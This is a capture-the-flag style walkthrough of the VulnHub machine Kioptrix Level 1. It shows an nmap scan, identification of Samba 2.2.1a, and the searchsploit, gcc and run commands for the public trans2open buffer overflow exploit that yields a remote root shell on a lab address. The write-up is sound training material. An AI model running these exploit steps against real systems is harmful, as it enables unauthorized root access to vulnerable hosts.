# Kioptrix Level 1 — VulnHub

| Field      | Value              |
|------------|--------------------|
| Platform   | VulnHub            |
| OS         | Linux (Red Hat)    |
| Difficulty | Easy               |
| Tags       | Samba 2.2.1a, trans2open buffer overflow, searchsploit, gcc |

---

## 1. Reconnaissance

```bash
nmap -p- --open -sCV -sS --min-rate 5000 -vvv -n -Pn -oN allPorts 192.168.0.27
```

| Port      | State | Service  | Version / Notes                        |
|-----------|-------|----------|----------------------------------------|
| 22/tcp    | Open  | SSH      | OpenSSH 2.9p2 (Protocol 1.99)          |
| 80/tcp    | Open  | HTTP     | Apache 1.3.20 (Red Hat/Linux)          |
| 111/tcp   | Open  | rpcbind  | RPC                                    |
| 139/tcp   | Open  | NetBIOS  | **Samba 2.2.1a**                       |
| 443/tcp   | Open  | HTTPS    | mod_ssl/2.8.4 OpenSSL                  |
| 32768/tcp | Open  | status   | RPC                                    |

The versions are extremely old — Apache 1.3.20, OpenSSH 2.9p2, and Samba 2.2.1a. Every one of them predates most modern vulnerability mitigations. Samba 2.2.1a is the most interesting: it is vulnerable to the **trans2open** stack buffer overflow (CVE-2003-0201), a well-known public exploit that gives unauthenticated remote root.

---

## 2. Vulnerability Identification

```bash
searchsploit samba 2.2.1
```

Found: `Samba < 2.2.8 (Linux/BSD) - Remote Code Execution` — exploit ID **10** (also referenced as `trans2open`).

---

## 3. Exploitation — Samba trans2open RCE

Downloaded and compiled the exploit:

```bash
searchsploit -m 10        # Download exploit 10.c
gcc 10.c -o exploit       # Compile
./exploit -b 0 192.168.0.27   # Run against target (-b 0 = Linux brute-force offset)
```

The exploit performs a stack buffer overflow in Samba's `trans2open` request handler. The `-b 0` flag selects the Linux target offset for brute-forcing the return address. Successful exploitation drops a remote root shell.

The initial shell is minimal — most interactive commands do not work. Spawn a proper bash session:

```bash
bash -i
```

Root access confirmed.

---

## Key Takeaways

**Outdated Samba versions are trivially exploitable.** Samba 2.2.x predates all modern stack protections (NX, ASLR, stack canaries). The trans2open exploit is unauthenticated and delivers immediate root — no post-exploitation needed.

**`searchsploit` is the first tool to run after identifying old service versions.** The workflow is: nmap → note old versions → `searchsploit <service> <version>` → download → compile → run.

**Always spawn a proper shell after exploitation.** Raw exploit shells lack job control and break on many commands. `bash -i` or a Python pty spawn immediately improves usability.
